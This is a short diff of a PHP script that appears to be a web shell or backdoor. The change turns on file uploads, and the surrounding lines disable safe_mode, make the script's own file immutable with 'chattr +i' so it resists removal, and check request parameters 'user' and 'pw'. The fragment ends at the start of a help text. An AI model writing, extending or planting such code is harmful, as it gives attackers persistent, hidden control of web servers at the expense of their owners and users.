@@ -11,7 +11,7 @@ define("split", str_repeat("-", 150));
 @ini_set('implicit_flush', 1);
 @ini_set('safe_mode', 0);
 @ini_set('safe_mode_gid', 0);
-@ini_set('file_uploads', 0);
+@ini_set('file_uploads', 1);
 @system("chattr +i " . $_SERVER['SCRIPT_FILENAME']) || @system("chattr +i " . __FILE__);
 if (isset($_REQUEST['user']) && isset($_REQUEST['pw'])) {
     $help = <<<_HELP
